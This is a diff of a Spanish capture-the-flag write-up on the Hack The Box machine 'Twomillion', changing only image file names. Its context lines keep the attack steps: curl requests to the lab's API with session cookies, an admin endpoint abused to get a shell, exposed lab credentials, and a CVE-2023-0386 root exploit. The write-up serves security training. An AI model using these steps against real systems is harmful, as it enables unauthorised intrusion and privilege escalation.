@@ -3,7 +3,7 @@ title: "Twomillion - WriteUp"
 date: Wed Apr 16 2025 17:30:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, reverse-shell, cve, exploit, nginx, php, linux, cve-2023-0386]
-image: /assets/img/htb-writeups/Pasted image 20231129111144.png
+image: /assets/img/htb-writeups/Pasted-image-20231129111144.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231129111144.png
   platform="HTB"
 %}
 
-![Twomillion](/assets/img/htb-writeups/Pasted image 20231129111144.png)
+![Twomillion](/assets/img/htb-writeups/Pasted-image-20231129111144.png)
 
 -----
 
@@ -42,29 +42,29 @@ Agregamos el NS _2million.htb_ al archivo _hosts_ ya que se acontece un virtual 
 
 HTTP
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129111144.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129111144.png)
 
 La web es un rompecabezas en el que tenemos que obtener un código de invitación para poder registrarte en la misma y obtener acceso.
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129114449.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129114449.png)
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129114527.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129114527.png)
 
 Lo primero que vamos a averiguar es la función que genera el código de invitación.
 
 Si nos vamos a la página http://2million.htb/invite y examinamos el código fuente con Ctrl+U veremos la función en JS que se ejecuta por detrás.
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129114808.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129114808.png)
 
 Si pinchamos sobre el enlace de la función veremos su código fuente, pero está ofuscado para que no lo podamos entender de primeras.
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129115021.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129115021.png)
 
 Copiamos el código y nos vamos a la página https://lelinhtinh.github.io/de4js/ que es un desofuscador de código online. 
 
 Pegamos el código copia y pulsamos en la opción "Eval".
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129115322.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129115322.png)
 
 Encontramos una función llamada "makeInviteCode()" y una URL a la que poder enviar un POST para generar supuestamente el código que estamos buscando.
 
@@ -112,19 +112,19 @@ Y tenemos el código!
 
 Vamos a probarlo...
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120548.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129120548.png)
 
 Rellenamos los campos...
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120721.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129120721.png)
 
 Y entramos con los datos proporcionados en el registro...
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120838.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129120838.png)
 
 Y estamos dentro...
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120939.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129120939.png)
 
 Ahora vamos a hacer una petición GET normal a la API por si nos devolviera algo, el comando _jq_ es para que nos lo devuelva bonito:
 
@@ -132,7 +132,7 @@ Ahora vamos a hacer una petición GET normal a la API por si nos devolviera algo
 $ curl -sv 2million.htb/api
 ```
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129123921.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129123921.png)
 
 Y nos devuelve nuestra cookie de inicio de sesión. Vamos a hacer la misma petición pero con la cookie y atacando a la API:
 
@@ -140,7 +140,7 @@ Y nos devuelve nuestra cookie de inicio de sesión. Vamos a hacer la misma petic
 $ curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=7286h49ko0ktvsoe2qm05l33hk" | jq
 ```
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129124506.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129124506.png)
 
 Tenemos todas las rutas de la API. Pero las que nos llama la atención son las que hacen referencia a _admin_. 
 
@@ -252,13 +252,13 @@ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3
 
 Y obtenemos acceso a la consola. Dentro!
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129132322.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129132322.png)
 
 Sanitizamos y empezamos la enumeración.
 
 Nada más entrar descubrimos unas credenciales de acceso:
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129132628.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129132628.png)
 
 ```http
 admin:SuperDuperPass123
@@ -302,9 +302,9 @@ Entramos en la carpeta resultante y ejecutamos un _make all_ ignorando los warni
 Creamos otra conexión hacia la máquina conectándonos por _ssh_ con las credenciales del usuario _admin_
  En una consola ejecutamos una parte del exploit y en la que ya teníamos abierta la otra parte como nos indican.
 
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129142710.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129142710.png)
  
-![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129142138.png)
+![TWOMILLION](/assets/img/htb-writeups/Pasted-image-20231129142138.png)
 
 Perfecto! Somos root y podemos registrar la última bandera!
 ---
